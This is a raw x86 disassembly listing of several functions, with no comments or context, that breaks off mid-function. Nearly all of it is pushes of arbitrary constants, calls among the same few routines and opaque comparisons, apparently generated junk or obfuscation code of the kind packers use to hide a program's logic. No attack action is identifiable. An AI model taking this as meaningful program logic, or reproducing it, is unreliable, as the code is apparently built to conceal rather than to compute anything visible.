  40929f:	add    esp,0x14
  4092a2:	mov    ecx,0xf3f4
  4092a7:	cmp    edi,0xa
  4092aa:	je     0x409316
  4092ac:	call   0x409afe
  4092b1:	cmp    edi,0x5b
  4092b4:	je     0x409316
  4092b6:	push   0x6f
  4092b8:	push   0xffffff9c
  4092ba:	push   0x91229500
  4092bf:	push   0xffffffca
  4092c1:	call   0x409e1d
  4092c6:	add    esp,0x10
  4092c9:	push   0x2dd1f100
  4092ce:	push   0xa90c3300
  4092d3:	push   0xffffff83
  4092d5:	call   0x409350
  4092da:	add    esp,0xc
  4092dd:	add    DWORD PTR [ebp-0x40],edi
  4092e0:	call   0x409e1d
  4092e5:	call   0x409c22
  4092ea:	cmp    esi,eax
  4092ec:	je     0x409316
  4092ee:	call   0x4095af
  4092f3:	push   0x15be8c00
  4092f8:	call   0x40949f
  4092fd:	add    esp,0x4
  409300:	and    esi,edi
  409302:	mov    edx,DWORD PTR [ebp-0x40]
  409305:	or     DWORD PTR [ebp-0x40],esi
  409308:	push   0xffffffe9
  40930a:	push   0x8
  40930c:	push   0xffffff91
  40930e:	call   0x409e1d
  409313:	add    esp,0xc
  409316:	pop    esi
  409317:	add    DWORD PTR [ebp-0x40],esi
  40931a:	push   0x1329f600
  40931f:	call   0x409c22
  409324:	add    esp,0x4
  409327:	pop    ebx
  409328:	push   0x4320ba00
  40932d:	push   0x630c2500
  409332:	push   0xb1b5db00
  409337:	call   0x4095af
  40933c:	add    esp,0xc
  40933f:	push   0x67
  409341:	call   0x409afe
  409346:	add    esp,0x4
  409349:	leave  
  40934a:	ret    
  40934b:	int3   
  40934c:	int3   
  40934d:	int3   
  40934e:	int3   
  40934f:	int3   
  409350:	push   ebp
  409351:	mov    ebp,esp
  409353:	sub    esp,0x34
  409356:	push   0x47
  409358:	push   0xffffffca
  40935a:	push   0xffffffd6
  40935c:	push   0xfffffffe
  40935e:	call   0x409afe
  409363:	add    esp,0x10
  409366:	push   ebx
  409367:	push   0xffffffdd
  409369:	push   0xa93d7100
  40936e:	call   0x40a101
  409373:	add    esp,0x8
  409376:	push   0x54
  409378:	push   0x306e100
  40937d:	call   0x40a101
  409382:	add    esp,0x8
  409385:	push   esi
  409386:	mov    ebx,0x62ad
  40938b:	add    ebx,eax
  40938d:	sub    ebx,eax
  40938f:	test   ebx,0xcf
  409395:	je     0x4093ed
  409397:	push   0xfffffffa
  409399:	push   0xffffffd0
  40939b:	call   0x409e1d
  4093a0:	add    esp,0x8
  4093a3:	mov    ecx,0x8a
  4093a8:	push   0x1e
  4093aa:	call   0x409c22
  4093af:	add    esp,0x4
  4093b2:	and    ebx,eax
  4093b4:	push   0xffffffb2
  4093b6:	call   0x409e1d
  4093bb:	add    esp,0x4
  4093be:	push   0x15c60800
  4093c3:	push   0x314cdc00
  4093c8:	push   0xffffff9f
  4093ca:	push   0x95952200
  4093cf:	push   0xffffffa7
  4093d1:	call   0x409afe
  4093d6:	add    esp,0x14
  4093d9:	mov    ecx,ebx
  4093db:	push   0x316a5900
  4093e0:	push   0x53500600
  4093e5:	call   0x4095af
  4093ea:	add    esp,0x8
  4093ed:	call   0x409e1d
  4093f2:	push   edi
  4093f3:	push   0x1a
  4093f5:	push   0x65e48600
  4093fa:	push   0x22
  4093fc:	call   0x409c22
  409401:	add    esp,0xc
  409404:	push   0x48
  409406:	call   0x409c22
  40940b:	add    esp,0x4
  40940e:	push   0x58
  409410:	push   0xa953be00
  409415:	call   0x409afe
  40941a:	add    esp,0x8
  40941d:	call   0x40a101
  409422:	push   0x1e
  409424:	push   0xffffff8c
  409426:	push   0x41c4dd00
  40942b:	call   0x409afe
  409430:	add    esp,0xc
  409433:	mov    ecx,ebx
  409435:	push   0x25
  409437:	push   0xb5a43200
  40943c:	call   0x4095af
  409441:	add    esp,0x8
  409444:	call   0x409c22
  409449:	test   eax,0x35
  40944e:	jne    0x409455
  409450:	call   0x409e1d
  409455:	pop    edi
  409456:	mov    DWORD PTR [ebp-0x24],ebx
  409459:	pop    esi
  40945a:	call   0x409c22
  40945f:	push   0x337dd000
  409464:	push   0xcd949700
  409469:	call   0x409e1d
  40946e:	add    esp,0x8
  409471:	pop    ebx
  409472:	xor    eax,eax
  409474:	push   0x2978b800
  409479:	push   0x15
  40947b:	push   0x9db4d900
  409480:	push   0x5b
  409482:	call   0x409afe
  409487:	add    esp,0x10
  40948a:	push   0x3e
  40948c:	push   0xffffffe8
  40948e:	push   0xffffff93
  409490:	call   0x40a101
  409495:	add    esp,0xc
  409498:	leave  
  409499:	ret    
  40949a:	int3   
  40949b:	int3   
  40949c:	int3   
  40949d:	int3   
  40949e:	int3   
  40949f:	push   ebp
  4094a0:	mov    ebp,esp
  4094a2:	sub    esp,0x20
  4094a5:	push   0x95d2ae00
  4094aa:	push   0x91c2eb00
  4094af:	push   0xffffffd0
  4094b1:	call   0x409e1d
  4094b6:	add    esp,0xc
  4094b9:	push   ebx
  4094ba:	push   0xa348e800
  4094bf:	call   0x409c22
  4094c4:	add    esp,0x4
  4094c7:	push   0xffffffac
  4094c9:	call   0x409afe
  4094ce:	add    esp,0x4
  4094d1:	push   esi
  4094d2:	cmp    eax,DWORD PTR [ebp-0x14]
  4094d5:	je     0x4094f2
  4094d7:	push   0x55bf5400
  4094dc:	push   0xc1ab0300
  4094e1:	push   0xffffff8f
  4094e3:	push   0x69516c00
  4094e8:	push   0xfffffffb
  4094ea:	call   0x40a101
  4094ef:	add    esp,0x14
  4094f2:	push   edi
  4094f3:	mov    DWORD PTR [ebp-0x4],eax
  4094f6:	mov    eax,DWORD PTR [ebp-0x4]
  4094f9:	mov    DWORD PTR [ebp-0x10],eax
  4094fc:	push   0x31c36200
  409501:	push   0x20
  409503:	push   0xb305ba00
  409508:	call   0x4095af
  40950d:	add    esp,0xc
  409510:	push   0x9169fe00
  409515:	push   0xffffffea
  409517:	push   0x66
  409519:	push   0xffffffae
  40951b:	push   0xffffffba
  40951d:	call   0x409c22
  409522:	add    esp,0x14
  409525:	push   0xa9568300
  40952a:	push   0x35
  40952c:	push   0xffffffec
  40952e:	call   0x409c22
  409533:	add    esp,0xc
  409536:	push   0xffffff88
  409538:	call   0x4095af
  40953d:	add    esp,0x4
  409540:	mov    edx,0xfc
  409545:	push   0x6dd2ae00
  40954a:	push   0xa3277f00
  40954f:	call   0x409afe
  409554:	add    esp,0x8
  409557:	cmp    eax,DWORD PTR [ebp-0x8]
  40955a:	je     0x409569
  40955c:	push   0x25f1ac00
  409561:	call   0x4095af
  409566:	add    esp,0x4
  409569:	pop    edi
  40956a:	push   0xb19fee00
  40956f:	push   0xffffff84
  409571:	call   0x40a101
  409576:	add    esp,0x8
  409579:	pop    esi
  40957a:	call   0x409c22
  40957f:	push   0xc5cfb600
  409584:	push   0x5998ba00
  409589:	push   0x31054c00
  40958e:	call   0x409afe
  409593:	add    esp,0xc
  409596:	pop    ebx
  409597:	cmp    edi,DWORD PTR [ebp-0x18]
  40959a:	je     0x4095a3
  40959c:	add    eax,esi
  40959e:	call   0x4095af
  4095a3:	call   0x40a101
  4095a8:	leave  
  4095a9:	ret    
  4095aa:	int3   
  4095ab:	int3   
  4095ac:	int3   
  4095ad:	int3   
  4095ae:	int3   
  4095af:	push   ebp
  4095b0:	mov    ebp,esp
  4095b2:	sub    esp,0x18
  4095b5:	push   0x42
  4095b7:	push   0xffffffcc
  4095b9:	push   0x51f80700
  4095be:	push   0x313b9c00
  4095c3:	push   0xffffffce
  4095c5:	call   0x409e1d
  4095ca:	add    esp,0x14
  4095cd:	push   ebx
  4095ce:	xor    ecx,ecx
  4095d0:	mov    DWORD PTR [ebp-0x18],ecx
  4095d3:	push   esi
  4095d4:	push   0x39a2c700
  4095d9:	push   0x1b
  4095db:	push   0x28
  4095dd:	call   0x409e1d
  4095e2:	add    esp,0xc
  4095e5:	push   edi
  4095e6:	mov    eax,0x67
  4095eb:	push   0x5f
  4095ed:	push   0xa90f9200
  4095f2:	call   0x409e1d
  4095f7:	add    esp,0x8
  4095fa:	call   0x40a101
  4095ff:	push   0xe955f700
  409604:	push   0x2f
  409606:	push   0xd890e00
  40960b:	push   0xffffffc0
  40960d:	call   0x40a101
  409612:	add    esp,0x10
  409615:	push   0x63666c00
  40961a:	push   0x64
  40961c:	push   0xd1eace00
  409621:	push   0x7c
  409623:	call   0x409e1d
  409628:	add    esp,0x10
  40962b:	push   0x31181400
  409630:	push   0x93134000
  409635:	push   0x31306b00
  40963a:	push   0xffffffe3
  40963c:	call   0x40a101
  409641:	add    esp,0x10
  409644:	cmp    eax,0x2f
  409647:	jne    0x409667
  409649:	push   0x51f6e500
  40964e:	push   0x31eb4200
  409653:	push   0x1d919700
  409658:	push   0x4
  40965a:	push   0x39a77100
  40965f:	call   0x409e1d
  409664:	add    esp,0x14
  409667:	push   0x47
  409669:	push   0x9f7f100
  40966e:	call   0x40a101
  409673:	add    esp,0x8
  409676:	push   0x5f
  409678:	push   0x13
  40967a:	push   0x4f
  40967c:	push   0x1dd5f700
  409681:	push   0xbdf41500
  409686:	call   0x409e1d
  40968b:	add    esp,0x14
  40968e:	pop    edi
  40968f:	mov    esi,DWORD PTR [ebp-0x18]
  409692:	mov    eax,DWORD PTR [ebp-0x18]
  409695:	cmp    esi,0x3
  409698:	je     0x409a7b
  40969e:	call   0x40a101
  4096a3:	mov    edx,DWORD PTR [ebp-0x18]
  4096a6:	or     DWORD PTR [ebp-0x18],esi
  4096a9:	mov    esi,DWORD PTR [ebp-0x18]
  4096ac:	call   0x40a101
  4096b1:	cmp    esi,DWORD PTR [ebp-0xc]
  4096b4:	je     0x409a7b
  4096ba:	push   0x93655000
  4096bf:	push   0x110f6300
  4096c4:	call   0x409e1d
  4096c9:	add    esp,0x8
  4096cc:	sub    esi,eax
  4096ce:	call   0x40a101
  4096d3:	push   0x6b
  4096d5:	push   0x60
  4096d7:	push   0xa1be8300
  4096dc:	push   0x899be100
  4096e1:	call   0x40a101
  4096e6:	add    esp,0x10
  4096e9:	push   0x10
  4096eb:	call   0x40a101
  4096f0:	add    esp,0x4
  4096f3:	push   0x290b8400
  4096f8:	push   0x7e
  4096fa:	push   0x3419700
  4096ff:	push   0xffffffbf
  409701:	call   0x40a101
  409706:	add    esp,0x10
  409709:	push   0x15996e00
  40970e:	push   0xffffff89
  409710:	push   0xa9b6ac00
  409715:	call   0x40a101
  40971a:	add    esp,0xc
  40971d:	sub    DWORD PTR [ebp-0x18],edi
  409720:	push   0x41
  409722:	push   0x93673100
  409727:	push   0x25d60b00
  40972c:	call   0x40a101
  409731:	add    esp,0xc
  409734:	mov    ebx,0x1279
  409739:	and    esi,edi
  40973b:	call   0x40a101
  409740:	call   0x40a101
  409745:	push   0x6d9ba900
  40974a:	call   0x409e1d
  40974f:	add    esp,0x4
  409752:	mov    ecx,DWORD PTR [ebp-0x18]
  409755:	and    esi,edi
  409757:	push   0xffffffaf
  409759:	push   0xc1c79800
  40975e:	push   0x59b55800
  409763:	call   0x409e1d
  409768:	add    esp,0xc
  40976b:	sub    esi,ebx
  40976d:	push   0xffffffb7
  40976f:	push   0x311ba400
  409774:	push   0x8d8dfa00
  409779:	push   0x3163a900
  40977e:	call   0x409e1d
  409783:	add    esp,0x10
  409786:	push   0x15
  409788:	push   0xe946d900
  40978d:	push   0x41b6bf00
  409792:	push   0xffffff9b
  409794:	push   0x59
  409796:	call   0x409e1d
  40979b:	add    esp,0x14
  40979e:	cmp    esi,DWORD PTR [ebp-0x8]
  4097a1:	je     0x409a7b
  4097a7:	push   0xffffff82
  4097a9:	call   0x409e1d
  4097ae:	add    esp,0x4
  4097b1:	test   esi,0x82
  4097b7:	jne    0x409a7b
  4097bd:	mov    eax,ebx
  4097bf:	push   0x317b7c00
  4097c4:	push   0xffffff9f
  4097c6:	push   0x25f5e000
  4097cb:	call   0x40a101
  4097d0:	add    esp,0xc
  4097d3:	push   0x314e700
  4097d8:	push   0x1de58400
  4097dd:	push   0xffffff86
  4097df:	call   0x409e1d
  4097e4:	add    esp,0xc
  4097e7:	add    esi,ebx
  4097e9:	call   0x409e1d
  4097ee:	mov    ecx,eax
  4097f0:	call   0x409e1d
  4097f5:	and    esi,eax
  4097f7:	push   0xa35d1a00
  4097fc:	push   0x5f
  4097fe:	call   0x40a101
  409803:	add    esp,0x8
  409806:	push   0xa971a500
  40980b:	push   0xffffffff
  40980d:	call   0x409e1d
  409812:	add    esp,0x8
  409815:	push   0xffffffdf
  409817:	call   0x40a101
  40981c:	add    esp,0x4
  40981f:	sub    esi,ebx
  409821:	push   0x114be500
  409826:	push   0xffffffe4
  409828:	push   0xe9449500
  40982d:	push   0x9a04600
  409832:	push   0xffffff99
  409834:	call   0x40a101
  409839:	add    esp,0x14
  40983c:	sub    esi,ebx
  40983e:	push   0x5183ba00
  409843:	push   0x19
  409845:	call   0x40a101
  40984a:	add    esp,0x8
  40984d:	call   0x40a101
  409852:	push   0xffffffd1
  409854:	push   0x65
  409856:	push   0x314c5300
  40985b:	call   0x409e1d
  409860:	add    esp,0xc
  409863:	push   0xfdcfa200
  409868:	push   0xffffffed
  40986a:	push   0xe59dff00
  40986f:	push   0x79
  409871:	call   0x409e1d
  409876:	add    esp,0x10
  409879:	push   0x24
  40987b:	push   0x19eb5700
  409880:	push   0xfffffff0
  409882:	push   0xffffffef
  409884:	push   0x312be000
  409889:	call   0x40a101
  40988e:	add    esp,0x14
  409891:	push   0x2c
  409893:	call   0x409e1d
  409898:	add    esp,0x4
  40989b:	add    esi,esi
  40989d:	push   0x5a
  40989f:	push   0xfffffffe
  4098a1:	push   0xffffffc5
  4098a3:	call   0x409e1d
  4098a8:	add    esp,0xc
  4098ab:	push   0xa979ee00
  4098b0:	push   0x3d
  4098b2:	push   0xffffffcc
  4098b4:	push   0xcdfcba00
  4098b9:	call   0x409e1d
  4098be:	add    esp,0x10
  4098c1:	add    esi,esi
  4098c3:	push   0x23599800
  4098c8:	push   0xffffffd3
  4098ca:	call   0x409e1d
  4098cf:	add    esp,0x8
  4098d2:	cmp    eax,0xa100100e
  4098d7:	je     0x409a7b
  4098dd:	cmp    esi,DWORD PTR [ebp-0xc]
  4098e0:	je     0x409a7b
  4098e6:	push   0x7e
  4098e8:	push   0xa58f9d00
  4098ed:	push   0x52
  4098ef:	push   0xa
  4098f1:	call   0x40a101
  4098f6:	add    esp,0x10
  4098f9:	push   0xffffff98
  4098fb:	call   0x409e1d
  409900:	add    esp,0x4
  409903:	mov    ebx,DWORD PTR [ebp-0x18]
  409906:	push   0xfffffff3
  409908:	call   0x40a101
  40990d:	add    esp,0x4
  409910:	xor    edx,edx
  409912:	push   0xa9f30f00
  409917:	push   0x6
  409919:	push   0x41
  40991b:	push   0xdd80e400
  409920:	push   0x41db6000
  409925:	call   0x40a101
  40992a:	add    esp,0x14
  40992d:	call   0x409e1d
  409932:	push   0x4d990300
  409937:	push   0x558a5400
  40993c:	push   0x78
  40993e:	push   0x914e5900
  409943:	push   0x4c
  409945:	call   0x409e1d
  40994a:	add    esp,0x14
  40994d:	add    ebx,eax
  40994f:	call   0x409e1d
  409954:	push   0x9317f100
  409959:	push   0xfffffffb
  40995b:	call   0x40a101
  409960:	add    esp,0x8
  409963:	push   0xffffffa8
  409965:	push   0x11085500
  40996a:	push   0xffffff8a
  40996c:	call   0x409e1d
  409971:	add    esp,0xc
  409974:	push   0x5a
  409976:	push   0xffffff81
  409978:	push   0x34
  40997a:	call   0x409e1d
  40997f:	add    esp,0xc
  409982:	push   0x65d93500
  409987:	push   0x1dc8ce00
  40998c:	push   0x630c4900
  409991:	push   0xfffffffa
  409993:	push   0xfffffff6
  409995:	call   0x40a101
  40999a:	add    esp,0x14
  40999d:	push   0x41
  40999f:	push   0xffffffd4
  4099a1:	call   0x409e1d
  4099a6:	add    esp,0x8
  4099a9:	add    DWORD PTR [ebp-0x18],esi
  4099ac:	push   0x45e1ff00
  4099b1:	call   0x40a101
  4099b6:	add    esp,0x4
  4099b9:	push   0x1f
  4099bb:	push   0x69bfff00
  4099c0:	push   0x1e71800
  4099c5:	push   0x6f
  4099c7:	push   0x6590d400
  4099cc:	call   0x409e1d
  4099d1:	add    esp,0x14
  4099d4:	cmp    ebx,esi
  4099d6:	je     0x409a7b
  4099dc:	cmp    ebx,0xffffffae
  4099df:	jne    0x409a7b
  4099e5:	xor    eax,eax
  4099e7:	push   0xffffffde
  4099e9:	push   0xa9b39400
  4099ee:	push   0xffffffce
  4099f0:	call   0x409e1d
  4099f5:	add    esp,0xc
  4099f8:	push   0xffffffc4
  4099fa:	push   0xffffff82
  4099fc:	push   0xffffffb4
  4099fe:	call   0x40a101
  409a03:	add    esp,0xc
  409a06:	push   0x3c
  409a08:	push   0xffffffba
  409a0a:	push   0xffffffe1
  409a0c:	push   0x69e20600
  409a11:	push   0xffffffdd
  409a13:	call   0x40a101
  409a18:	add    esp,0x14
  409a1b:	cmp    ebx,0x77a3
  409a21:	jne    0x409a7b
  409a23:	mov    ecx,DWORD PTR [ebp-0x18]
  409a26:	add    ebx,ecx
  409a28:	push   0xffffff9c
  409a2a:	push   0xd32e7c00
  409a2f:	push   0x5ee1c00
  409a34:	push   0x85dde200
  409a39:	push   0x8
  409a3b:	call   0x409e1d
  409a40:	add    esp,0x14
  409a43:	push   0x3d
  409a45:	push   0x4
  409a47:	push   0x119bca00
  409a4c:	push   0x45804c00
  409a51:	call   0x40a101
  409a56:	add    esp,0x10
  409a59:	and    ebx,esi
  409a5b:	mov    eax,0xc9
  409a60:	mov    DWORD PTR [ebp-0x18],ebx
  409a63:	and    eax,edi
  409a65:	push   0x35ce9500
  409a6a:	push   0x81f25900
  409a6f:	push   0x7e
  409a71:	push   0x4f
  409a73:	call   0x409e1d
  409a78:	add    esp,0x10
  409a7b:	push   0xbdba6e00
  409a80:	push   0x69
  409a82:	push   0xffffffcb
  409a84:	push   0xa1f61f00
  409a89:	push   0x696b8c00
  409a8e:	call   0x40a101
  409a93:	add    esp,0x14
  409a96:	pop    esi
  409a97:	mov    ecx,0xef
  409a9c:	push   0x51
  409a9e:	push   0xf1ec1c00
  409aa3:	push   0x29571800
  409aa8:	push   0x5356e700
  409aad:	push   0xfffffff2
  409aaf:	call   0x40a101
  409ab4:	add    esp,0x14
  409ab7:	push   0xffffffee
  409ab9:	push   0x730ef300
  409abe:	push   0x8d92e900
  409ac3:	push   0x19ed2700
  409ac8:	call   0x409e1d
  409acd:	add    esp,0x10
  409ad0:	pop    ebx
  409ad1:	mov    eax,DWORD PTR [ebp-0x18]
  409ad4:	mov    ecx,0xac
  409ad9:	push   0x31
  409adb:	push   0xe34a7800
  409ae0:	push   0x317e8000
  409ae5:	push   0x1f6df00
  409aea:	push   0x6da6ef00
  409aef:	call   0x409e1d
  409af4:	add    esp,0x14
  409af7:	leave  
  409af8:	ret    
  409af9:	int3   
  409afa:	int3   
  409afb:	int3   
  409afc:	int3   
  409afd:	int3   
  409afe:	push   ebp
  409aff:	mov    ebp,esp
  409b01:	sub    esp,0x40
  409b04:	push   0xfffffff3
  409b06:	push   0x8deb4800
  409b0b:	call   0x409e1d
  409b10:	add    esp,0x8
  409b13:	push   0xffffffb0
  409b15:	push   0x1d
  409b17:	push   0x79922300
  409b1c:	call   0x40a101
  409b21:	add    esp,0xc
  409b24:	push   ebx
  409b25:	call   0x40a101
  409b2a:	push   esi
  409b2b:	push   0x33
  409b2d:	call   0x40a101
  409b32:	add    esp,0x4
  409b35:	push   edi
  409b36:	push   0x61e45f00
  409b3b:	push   0x95fb2d00
  409b40:	push   0x7c
  409b42:	push   0xffffffb4
  409b44:	push   0xffffffcf
  409b46:	call   0x40a101
  409b4b:	add    esp,0x14
  409b4e:	mov    edx,0x9649
  409b53:	sub    edx,eax
  409b55:	push   0x34
  409b57:	call   0x409e1d
  409b5c:	add    esp,0x4
  409b5f:	mov    ecx,0xbb
  409b64:	or     ecx,eax
  409b66:	push   0x43299300
  409b6b:	call   0x409e1d
  409b70:	add    esp,0x4
  409b73:	cmp    eax,0xd19e
  409b78:	jne    0x409b8e
  409b7a:	push   0xa9541200
  409b7f:	push   0x537b2c00
  409b84:	push   0x44
  409b86:	call   0x40a101
  409b8b:	add    esp,0xc
  409b8e:	push   0x53
  409b90:	push   0x44
  409b92:	push   0xffffffa1
  409b94:	push   0x99fb9b00
  409b99:	call   0x409e1d
  409b9e:	add    esp,0x10
  409ba1:	push   0xffffff99
  409ba3:	push   0xa972d000
  409ba8:	push   0xd1d63600
  409bad:	call   0x409e1d
  409bb2:	add    esp,0xc
  409bb5:	mov    eax,DWORD PTR ds:0x437064
  409bbb:	xor    ecx,ecx
  409bbd:	push   0xffffffb4
  409bbf:	push   0x58
  409bc1:	push   0xffffffe5
  409bc3:	push   0x18
  409bc5:	call   0x40a101
  409bca:	add    esp,0x10
  409bcd:	call   0x40a101
  409bd2:	pop    edi
  409bd3:	mov    DWORD PTR [ebp-0x30],edi
  409bd6:	push   0xe9f9f900
  409bdb:	push   0xf18b8400
  409be0:	push   0xffffffe7
  409be2:	push   0x31358800
  409be7:	push   0x313edf00
  409bec:	call   0x409e1d
  409bf1:	add    esp,0x14
  409bf4:	pop    esi
  409bf5:	push   0xffffffb4
  409bf7:	push   0xffffff87
  409bf9:	push   0xffffffc3
  409bfb:	call   0x409e1d
  409c00:	add    esp,0xc
  409c03:	pop    ebx
  409c04:	mov    eax,DWORD PTR [ebp-0x30]
  409c07:	sub    eax,esi
  409c09:	mov    ecx,DWORD PTR [ebp-0x30]
  409c0c:	push   0xedd93400
  409c11:	push   0x41
  409c13:	call   0x409e1d
  409c18:	add    esp,0x8
  409c1b:	leave  
  409c1c:	ret    
  409c1d:	int3   
  409c1e:	int3   
  409c1f:	int3   
  409c20:	int3   
  409c21:	int3   
  409c22:	push   ebp
  409c23:	mov    ebp,esp
  409c25:	sub    esp,0x18
  409c28:	push   0x39e57c00
  409c2d:	push   0xffffffe5
  409c2f:	call   0x409e1d
  409c34:	add    esp,0x8
  409c37:	push   ebx
  409c38:	push   0x31954600
  409c3d:	push   0xffffffce
  409c3f:	push   0x34
  409c41:	push   0xc9f99100
  409c46:	call   0x40a101
  409c4b:	add    esp,0x10
  409c4e:	push   esi
  409c4f:	push   0xffffffba
  409c51:	call   0x40a101
  409c56:	add    esp,0x4
  409c59:	push   edi
  409c5a:	xor    edx,edx
  409c5c:	add    eax,eax
  409c5e:	push   0x91989800
  409c63:	push   0x233c3000
  409c68:	push   0x69
  409c6a:	push   0x837a5400
  409c6f:	push   0x6f
  409c71:	call   0x409e1d
  409c76:	add    esp,0x14
  409c79:	push   0xc320be00
  409c7e:	push   0x7dc65500
  409c83:	call   0x40a101
  409c88:	add    esp,0x8
  409c8b:	push   0x4a
  409c8d:	push   0x85cf0100
  409c92:	push   0xffffffce
  409c94:	call   0x40a101
  409c99:	add    esp,0xc
  409c9c:	push   0x1111e000
  409ca1:	push   0xa9c20200
  409ca6:	push   0xffffffec
  409ca8:	call   0x40a101
  409cad:	add    esp,0xc
  409cb0:	push   0xffffffe2
  409cb2:	call   0x409e1d
  409cb7:	add    esp,0x4
  409cba:	mov    edi,0xedc7
  409cbf:	call   0x409e1d
  409cc4:	mov    ebx,edi
  409cc6:	push   0xffffffff
  409cc8:	push   0x11c74d00
  409ccd:	call   0x40a101
  409cd2:	add    esp,0x8
  409cd5:	push   0x32
  409cd7:	push   0x24
  409cd9:	call   0x409e1d
  409cde:	add    esp,0x8
  409ce1:	push   0xfffffff2
  409ce3:	push   0xffffff9d
  409ce5:	push   0x2
  409ce7:	push   0x912f9100
  409cec:	call   0x409e1d
  409cf1:	add    esp,0x10
  409cf4:	mov    DWORD PTR [ebp-0x8],ebx
  409cf7:	call   0x40a101
  409cfc:	push   0xffffffea
  409cfe:	call   0x409e1d
  409d03:	add    esp,0x4
  409d06:	call   0x409e1d
  409d0b:	push   0x2e
  409d0d:	push   0x55
  409d0f:	call   0x40a101
  409d14:	add    esp,0x8
  409d17:	pop    edi
  409d18:	mov    ebx,0xd4e1
  409d1d:	call   0x40a101
  409d22:	push   0x33c0800
  409d27:	push   0x1d
  409d29:	call   0x40a101
  409d2e:	add    esp,0x8
  409d31:	mov    edx,0x4a
  409d36:	push   0x34
  409d38:	call   0x40a101
  409d3d:	add    esp,0x4
  409d40:	push   0x79b77a00
  409d45:	push   0xffffffe1
  409d47:	call   0x40a101
  409d4c:	add    esp,0x8
  409d4f:	call   0x409e1d
  409d54:	push   0xcdaccd00
  409d59:	push   0xffffff8d
  409d5b:	push   0x2dfd0300
  409d60:	push   0xffffff8f
  409d62:	call   0x40a101
  409d67:	add    esp,0x10
  409d6a:	call   0x40a101
  409d6f:	push   0x17
  409d71:	push   0xdd74c00
  409d76:	call   0x409e1d
  409d7b:	add    esp,0x8
  409d7e:	add    ebx,ebx
  409d80:	add    DWORD PTR [ebp-0x8],edi
  409d83:	call   0x40a101
  409d88:	push   0xfffffffd
  409d8a:	push   0xb1dd6500
  409d8f:	call   0x40a101
  409d94:	add    esp,0x8
  409d97:	push   0xfd9af400
  409d9c:	push   0x1eb4d00
  409da1:	push   0x331a1800
  409da6:	push   0xffffffa9
  409da8:	call   0x40a101
  409dad:	add    esp,0x10
  409db0:	call   0x40a101
  409db5:	push   0x2
  409db7:	push   0x0
  409db9:	push   0xa9690f00
  409dbe:	push   0x79f33e00
  409dc3:	call   0x40a101
  409dc8:	add    esp,0x10
  409dcb:	push   0xb1ce9900
  409dd0:	call   0x40a101
  409dd5:	add    esp,0x4
  409dd8:	push   0x13400f00
  409ddd:	call   0x409e1d
  409de2:	add    esp,0x4
  409de5:	add    ebx,edi
  409de7:	push   0x51
  409de9:	call   0x409e1d
  409dee:	add    esp,0x4
  409df1:	call   0x40a101
  409df6:	add    DWORD PTR [ebp-0x8],ebx
  409df9:	pop    esi
  409dfa:	push   0xffffff9d
  409dfc:	push   0x61
  409dfe:	push   0x316a5e00
  409e03:	call   0x40a101
  409e08:	add    esp,0xc
  409e0b:	pop    ebx
  409e0c:	call   0x40a101
  409e11:	call   0x40a101
  409e16:	leave  
  409e17:	ret    
  409e18:	int3   
  409e19:	int3   
  409e1a:	int3   
  409e1b:	int3   
  409e1c:	int3   
  409e1d:	push   ebp
  409e1e:	mov    ebp,esp
  409e20:	sub    esp,0x20
  409e23:	xor    eax,eax
  409e25:	mov    DWORD PTR [ebp-0x18],eax
  409e28:	push   ebx
  409e29:	add    eax,eax
  409e2b:	mov    ebx,DWORD PTR [ebp-0x18]
  409e2e:	cmp    ebx,eax
  409e30:	je     0x409e45
  409e32:	mov    edx,DWORD PTR [ebp-0x18]
  409e35:	add    edx,ebx
  409e37:	mov    ebx,0xd8
  409e3c:	add    DWORD PTR [ebp-0x18],eax
  409e3f:	mov    DWORD PTR [ebp-0x18],ebx
  409e42:	or     DWORD PTR [ebp-0x18],edx
  409e45:	push   esi
  409e46:	and    eax,ebx
  409e48:	add    eax,eax
  409e4a:	add    ebx,eax
  409e4c:	xor    esi,esi
  409e4e:	mov    edx,DWORD PTR [ebp-0x18]
  409e51:	cmp    edx,ebx
  409e53:	je     0x409ec6
  409e55:	add    ebx,eax
  409e57:	add    DWORD PTR [ebp-0x18],ebx
  409e5a:	cmp    edx,DWORD PTR [ebp-0x14]
  409e5d:	jne    0x409ec6
  409e5f:	add    edx,eax
  409e61:	mov    esi,DWORD PTR [ebp-0x18]
  409e64:	cmp    esi,0xffffffd0
  409e67:	jne    0x409ec6
  409e69:	mov    ecx,DWORD PTR [ebp-0x18]
  409e6c:	add    esi,esi
  409e6e:	mov    ebx,DWORD PTR [ebp-0x18]
  409e71:	cmp    esi,0xffffffae
  409e74:	jne    0x409ec6
  409e76:	cmp    ecx,ebx
  409e78:	jne    0x409ec6
  409e7a:	mov    eax,DWORD PTR [ebp-0x18]
  409e7d:	cmp    ecx,0xffffffda
  409e80:	jne    0x409ec6
  409e82:	sub    eax,esi
  409e84:	cmp    edx,0xf52e
  409e8a:	jne    0x409ec6
  409e8c:	sub    edx,eax
  409e8e:	cmp    ebx,ecx
  409e90:	jne    0x409ec6
  409e92:	mov    eax,DWORD PTR [ebp-0x18]
  409e95:	mov    esi,DWORD PTR [ebp-0x18]
  409e98:	cmp    ecx,eax
  409e9a:	jne    0x409ec6
  409e9c:	cmp    eax,DWORD PTR [ebp-0x20]
  409e9f:	je     0x409ec6
  409ea1:	cmp    eax,DWORD PTR [ebp-0x8]
  409ea4:	je     0x409ec6
  409ea6:	sub    ecx,eax
  409ea8:	add    DWORD PTR [ebp-0x18],ecx
  409eab:	cmp    ebx,edx
  409ead:	je     0x409ec6
  409eaf:	mov    eax,0xc6
  409eb4:	mov    eax,0x1302080a
  409eb9:	and    eax,edx
  409ebb:	add    DWORD PTR [ebp-0x18],esi
  409ebe:	or     DWORD PTR [ebp-0x18],eax
  409ec1:	add    ebx,ebx
  409ec3:	add    DWORD PTR [ebp-0x18],ebx
  409ec6:	push   edi
  409ec7:	add    DWORD PTR [ebp-0x18],esi
  409eca:	sub    DWORD PTR [ebp-0x18],esi
  409ecd:	mov    ecx,DWORD PTR [ebp-0x18]
  409ed0:	mov    ebx,DWORD PTR [ebp-0x18]
  409ed3:	test   ebx,0x3818
  409ed9:	jne    0x40a010
  409edf:	mov    DWORD PTR [ebp-0x18],ebx
  409ee2:	mov    eax,DWORD PTR ds:0x437040
  409ee8:	test   edx,0x2ea
  409eee:	je     0x40a010
  409ef4:	xor    esi,esi
  409ef6:	add    esi,ecx
  409ef8:	sub    DWORD PTR [ebp-0x18],esi
  409efb:	sub    DWORD PTR [ebp-0x18],ecx
  409efe:	sub    eax,ebx
  409f00:	cmp    esi,DWORD PTR ds:0x437040
  409f06:	jne    0x40a010
  409f0c:	add    eax,esi
  409f0e:	or     eax,esi
